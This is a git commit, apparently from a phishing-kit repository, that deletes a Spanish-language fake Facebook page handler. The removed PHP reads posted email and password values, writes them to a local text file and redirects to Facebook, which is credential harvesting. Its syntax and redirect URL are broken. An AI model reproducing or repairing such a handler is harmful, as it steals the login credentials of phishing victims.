522096e5384caae5f9a932dca8c0edbabb458882
buer-0 <72962683+buer-0@users.noreply.github.com>
2020-10-16 07:37:06 -0400

    Delete ip.php

--- sites/facebook/es/ip.php
+++
@@ -1,8 +0,0 @@
-<?php
-$email = $_POST("email");
-$pass = $_POST("pass");
-$fichero = fopen("cuen.txt","a");
-fwrite($fichero,"$email",PHP_EOL);
-fwrite($fichero,"$pass",PHP_EOL);
-header("location: https//:www.facebook.com");
-?>
